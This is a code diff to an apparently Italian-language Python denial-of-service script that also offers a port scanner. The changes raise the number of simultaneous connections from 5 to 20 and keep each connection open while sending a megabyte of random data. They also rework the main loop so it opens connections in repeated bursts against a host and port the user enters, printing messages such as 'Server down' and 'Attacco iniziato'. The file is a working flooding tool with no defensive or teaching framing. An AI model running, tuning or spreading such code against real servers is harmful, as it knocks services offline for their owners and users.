@@ -3,7 +3,7 @@ import threading
 import time
 import random
 import sys
-NUM_CONNECTIONS = 5
+NUM_CONNECTIONS = 20
 dd = 1024 * 1024  # 1 MB di dati casuali
 extra_data = random._urandom(dd)
 ip = ""
@@ -25,7 +25,7 @@ def open_connection():
         while True:
             time.sleep(1)
     except Exception as e:
-        print("Errore: ", e)
+        print("[+] Server down.")
 
 # Funzione principale che gestisce le connessioni
 def connect(port):
@@ -46,11 +46,13 @@ def portscan():
         t.start()
     for t in threads:
         t.join()
-    print("Scan finished.")
+    print("[+] Scan finished.")
     
 def print_attacks():
     print(f"Connessionni aperte: {str(attacks)}\r")   
     
+conns = 0    
+
 def start_dos():
     try:
         threadsa = []
@@ -58,9 +60,8 @@ def start_dos():
             t = threading.Thread(target=open_connection)
             t.start()
             threadsa.append(t)
-        print("5 nuove connessioni aperte")
+        print("[+] 20 nuove connessioni aperte")
     except KeyboardInterrupt:
-        print("Stopping the attack..")
         sys.exit()
 
 
@@ -74,9 +75,16 @@ if __name__ == "__main__":
         ip = TARGET_HOST
         TARGET_PORT = int(input("Port> "))
         portad = TARGET_PORT
-        print("Attacco iniziato")
-        while True:
-            start_dos()
+        print("[+] Attacco iniziato")
+        c = 0
+        while (KeyboardInterrupt):
+            if (c <= 250):
+                start_dos()
+                c += 20
+            else:
+                c = 0
+                print("Sleeping for 1 second")
+                time.sleep(1)
         
     if choice == "2":
         ipa = input("Ip to scan> ")
